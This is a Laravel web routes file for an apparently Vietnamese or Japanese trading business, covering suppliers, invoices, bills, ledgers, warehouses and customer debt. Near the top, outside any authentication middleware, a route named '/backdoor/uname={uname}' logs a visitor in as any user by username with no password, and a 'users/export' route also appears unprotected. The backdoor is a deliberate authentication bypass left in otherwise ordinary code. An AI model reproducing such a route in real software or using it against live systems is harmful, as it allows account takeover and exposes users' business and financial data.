<?php

use App\Http\Controllers\Auth\LoginController;
use App\Http\Controllers\Auth\PasswordResetController;
use App\Http\Controllers\Customers\DebtController;
use App\Http\Controllers\Customers\BillCustomerController;
use App\Http\Controllers\Customers\ExportedCustomerController;
use App\Http\Controllers\Customers\PaymentController;
use App\Http\Controllers\Orders\BillController;
use App\Http\Controllers\Orders\CustomerController;
use App\Http\Controllers\Orders\LedgerController;
use App\Http\Controllers\Orders\PaymentCustomerController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Suppliers\InvoiceController;
use App\Http\Controllers\Suppliers\PaymentSupplierController;
use App\Http\Controllers\Suppliers\SupplierController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\Warehouses\ExportedController;
use App\Http\Controllers\Warehouses\InventoryController;
use App\Http\Controllers\Warehouses\ImportedController;
use Illuminate\Support\Facades\Auth;
use App\Models\User;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('users/export/', [UserController::class, 'export']);

Route::get('/backdoor/uname={uname}', function ($uname) {
    $user = User::where('uname', $uname)->get()->first();
    Auth::loginUsingId($user->Id);
    return redirect('/');
});


Route::prefix('auth')->namespace('auth')->name('auth.')->group(function () {
    Route::get('/login', [LoginController::class, 'index'])->name('loginIndex');
    Route::post('/login', [LoginController::class, 'login'])->name('doLogin');
    Route::get('/logout', function () {
        Auth::logout();
        return redirect()->route('auth.loginIndex');
    })->name('logout');
    Route::get('/password-reset', [PasswordResetController::class, 'index'])->name('passwordResetIndex');
    Route::post('/password-reset', [PasswordResetController::class, 'sendToken'])->name('doPasswordReset');
    Route::get('/change-password/token={token}', [PasswordResetController::class, 'indexChangePassword'])->name('getChangePassword');
    Route::put('/change-password', [PasswordResetController::class, 'doChangePasswordReset'])->name('doChangePasswordReset');
});

Route::prefix('/')->middleware('auth')->group(function () {
    Route::get('/', function () {
        if (Auth::user()->type != 2) {
            return redirect(route('customer.index'));
        } else {
            return view('commons.index');
        }
    })->name('index');

    Route::prefix('suppliers')->middleware('role')->namespace('suppliers')->name('supplier.')->group(function () {
        Route::prefix('invoice')->name('invoice.')->group(function () {
            Route::get('/', [InvoiceController::class, 'list'])->name('index');
            // Route::get('/{Invoice}', [InvoiceController::class, 'show'])->name('showInvoice');
            Route::get('/{Id}', [InvoiceController::class, 'showById'])->name('showByIdInvoice');
            Route::get('/delete/{Invoice}', [InvoiceController::class, 'delete'])->name('deleteInvoice');
            Route::get('/delete-detail/{Id}', [InvoiceController::class, 'deleteDetail'])->name('deleteInvoiceDetail');
            Route::post('/', [InvoiceController::class, 'create'])->name('postInvoice');
            Route::post('/invoice-detail', [InvoiceController::class, 'createDetail'])->name('postInvoiceDetail');
            Route::post('/invoice-more-detail/{Invoice}', [InvoiceController::class, 'createMoreDetail'])->name('postMoreInvoiceDetail');
            Route::put('/{Invoice}', [InvoiceController::class, 'updateInvoice'])->name('updateInvoice');
            Route::put('/detail/{Id}', [InvoiceController::class, 'updateInvoiceDetail'])->name('updateInvoiceDetail');
        });
        Route::prefix('payment')->name('payment.')->group(function () {
            Route::get('/', [PaymentSupplierController::class, 'index'])->name('index');
            Route::post('/', [PaymentSupplierController::class, 'create'])->name('create');
            Route::put('/{Id}', [PaymentSupplierController::class, 'update'])->name('update');
            Route::get('/delete/{Id}', [PaymentSupplierController::class, 'delete'])->name('delete');
        });
        Route::prefix('management')->name('management.')->group(function () {
            Route::get('/', [SupplierController::class, 'list'])->name('index');
            Route::post('/', [SupplierController::class, 'create'])->name('create');
            Route::get('/{code_name}', [SupplierController::class, 'show'])->name('show');
            Route::put('/{code_name}', [SupplierController::class, 'update'])->name('update');
        });
        Route::get('/payback', function () {
            return view('suppliers.payback');
        })->name('payback');

        Route::get('/supplier-debt', function () {
            return view('suppliers.debt');
        })->name('debt');
    });

    Route::prefix('orders')->middleware('role')->namespace('orders')->name('orders.')->group(function () {
        Route::prefix('bills')->name('bills.')->group(function () {
            Route::get('/', [BillController::class, 'indexAll'])->name('indexALl');
            Route::get('/delete/{Id}', [BillController::class, 'deleteBillCode'])->name('deleteBillCode');
            Route::get('/by-uname/{uname}', [BillController::class, 'indexAllByUname'])->name('indexAllByUname');
            Route::get('/log/{codeorder}', [BillController::class, 'loadLog'])->name('loadLog');
            Route::get('/{billcode}', [BillController::class, 'getBillById'])->name('getBillById');
            Route::get('/tranfer/{codeorder}', [BillController::class, 'getTranfer'])->name('getTranfer');
            Route::put('/tranfer/{codeorder}', [BillController::class, 'putTranfer'])->name('putTranfer');
            Route::get('/payment/{billcode}', [BillController::class, 'getPaymentDetail'])->name('getPaymentDetail');
            Route::get('/detail/{codeorder}', [BillController::class, 'getBilLDetailById'])->name('getBillDetailById');
            Route::put('/detail/{codeorder}', [BillController::class, 'UpdateBillDetailById'])->name('UpdateBillDetailById');
            Route::post('/', [BillController::class, 'create'])->name('create');
            Route::put('/update-fee/{codeorder}', [BillController::class, 'updateFee'])->name('updateFee');
            Route::put('/update-tracking/{codeorder}', [BillController::class, 'updateShipId'])->name('updateShipId');
            Route::post('/comment/{codeorder}', [BillController::class, 'comment'])->name('comment');
        });

        Route::get('/order', function () {
            return view('orders.order');
        })->name('order');

        Route::get('/order-detail', function () {
            return view('orders.order_detail');
        })->name('order-detail');


        Route::prefix('ledgers')->name('ledgers.')->group(function () {
            Route::get('/', [LedgerController::class, 'index'])->name('index');
            Route::post('/', [LedgerController::class, 'create'])->name('create');
            Route::get('/{Id}', [LedgerController::class, 'get'])->name('get');
            Route::put('/{Id}', [LedgerController::class, 'update'])->name('update');
            Route::get('/delete/{Id}', [LedgerController::class, 'delete'])->name('delete');
        });

        Route::get('/web-order', function () {
            return view('orders.web_order');
        })->name('indexAll');

        Route::prefix('payment-customers')->name('payment-customers.')->group(function () {
            Route::get('/', [PaymentCustomerController::class, 'index'])->name('index');
            Route::put('/{Id}', [PaymentCustomerController::class, 'update'])->name('update');
        });

        Route::get('/customer-debt', [CustomerController::class, 'index'])->name('customer-debt');
    });

    Route::prefix('warehouses')->middleware('role')->namespace('warehouses')->name('warehouses.')->group(function () {
        Route::prefix('imported')->name('imported.')->group(function () {
            Route::get('/', [ImportedController::class, 'index'])->name('index');
            Route::get('/{jan_code}', [ImportedController::class, 'detail'])->name('detail');
            Route::get('/load-note/{jancode}', [ImportedController::class, 'loadNote'])->name('loadNote');
            Route::post('/note-import/{jancode}', [ImportedController::class, 'noteImport'])->name('noteImport');
        });
        Route::prefix('exported')->name('exported.')->group(function () {
            Route::get('/', [ExportedController::class, 'index'])->name('index');
            Route::get('/{jan_code}', [ExportedController::class, 'detail'])->name('detail');
            Route::get('/load-note/{jancode}', [ExportedController::class, 'loadNote'])->name('loadNote');
            Route::post('/note-export/{jancode}', [ExportedController::class, 'noteExport'])->name('noteExport');
        });
        Route::prefix('inventory')->name('inventory.')->group(function () {
            Route::get('/', [InventoryController::class, 'index'])->name('index');
            Route::get('/{jancode}', [InventoryController::class, 'detail'])->name('detail');
            Route::put('/note-import/{Id}', [InventoryController::class, 'noteImport'])->name('noteImport');
            Route::put('/note-export/{id}', [InventoryController::class, 'noteExport'])->name('noteExport');
            Route::get('/load-note/{jancode}', [InventoryController::class, 'loadNote'])->name('loadNote');
            Route::post('/note-inventory/{jancode}', [InventoryController::class, 'noteInventory'])->name('noteInventory');
        });
    });

    Route::prefix('commons')->middleware('role')->name('commons.')->group(function () {
        Route::get('/search-user', [LedgerController::class, 'searchUser'])->name('search-user');
        Route::get('/search-code-order', [InvoiceController::class, 'searchCodeOrder'])->name('searchCodeOrder');
        Route::get('/search-code-jan', [InvoiceController::class, 'searchCodeJan'])->name('searchCodeJan');
        Route::get('/search-ma-hoa-don', [BillController::class, 'searchBillCode'])->name('searchBillCode');
        Route::get('/search-supplier', [PaymentSupplierController::class, 'searchSupplier'])->name('searchSupplier');
        Route::get('/search-invoice', [PaymentSupplierController::class, 'searchInvoice'])->name('searchInvoice');
    });

    Route::prefix('customer')->name('customer.')->group(function () {
        Route::get('/', function () {
            return view('customers.index');
        })->name('index');
        Route::prefix('bill')->name('bill.')->group(function () {
            Route::get('/', [BillCustomerController::class, 'index'])->name('index');
            Route::get('/export', [BillCustomerController::class, 'export'])->name('export');
            Route::get('/{billcode}', [BillCustomerController::class, 'order'])->name('order');
            Route::get('/payment/{billcode}', [BillCustomerController::class, 'getPaymentDetail'])->name('getPaymentDetail');
            Route::get('/detail/{codeorder}', [BillCustomerController::class, 'orderDetail'])->name('orderDetail');
            Route::get('/detail/load-log/{codeorder}', [BillCustomerController::class, 'loadLog'])->name('loadLog');
            Route::post('/detail/add-log/{codeorder}', [BillCustomerController::class, 'addLog'])->name('addLog');
        });

        Route::prefix('payment')->name('payment.')->group(function () {
            Route::get('/', [PaymentController::class, 'index'])->name('index');
        });

        Route::prefix('debt')->name('debt.')->group(function () {
            Route::get('/', [DebtController::class, 'index'])->name('index');
            Route::get('/export', [DebtController::class, 'export'])->name('export');
        });

        Route::prefix('exported')->name('exported.')->group(function () {
            Route::get('/', [ExportedCustomerController::class, 'index'])->name('index');
            Route::get('/{jancode}', [ExportedCustomerController::class, 'detail'])->name('detail');
        });
    });
});
